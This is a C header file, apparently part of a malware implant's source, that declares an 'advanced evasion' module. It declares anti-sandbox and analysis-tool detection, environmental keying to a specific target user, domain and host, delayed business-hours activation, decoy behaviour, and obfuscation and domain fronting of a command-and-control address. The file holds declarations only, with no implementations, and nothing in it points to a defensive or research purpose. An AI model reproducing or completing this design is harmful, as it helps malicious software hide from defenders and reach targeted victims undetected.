/*
 * Advanced Evasion Techniques - Header
 */

#ifndef EVASION_H
#define EVASION_H

#include <stdint.h>
#include <stddef.h>

// String obfuscation
void decrypt_string(char* str, size_t len);

// Random delays
uint32_t random_delay(uint32_t min_ms, uint32_t max_ms);
void jittered_sleep(uint32_t base_ms, uint32_t jitter_ms);
void polymorphic_sleep(uint32_t target_ms);

// Anti-sandbox checks
int detect_time_acceleration(void);
int check_system_uptime(void);
int check_user_activity(void);
int check_process_count(void);
int check_internet_connectivity(void);

// Time-based activation
int is_business_hours(void);

// Environmental keying
int validate_environment(const char* target_username, 
                        const char* target_domain,
                        const char* target_hostname);

// Decoy behavior
void perform_decoy_behavior(void);

// Main evasion logic
int should_execute(void);
void stealthy_startup(void);

// C2 obfuscation
void deobfuscate_c2_address(char* output, size_t max_len);
void get_fronted_domain(char* output, size_t max_len);

// Retry logic
typedef struct {
    int attempt;
    uint32_t base_delay;
    uint32_t max_delay;
} retry_config_t;

uint32_t calculate_retry_delay(retry_config_t* config);

// Analysis tool detection
int detect_analysis_tools(void);

#endif // EVASION_H
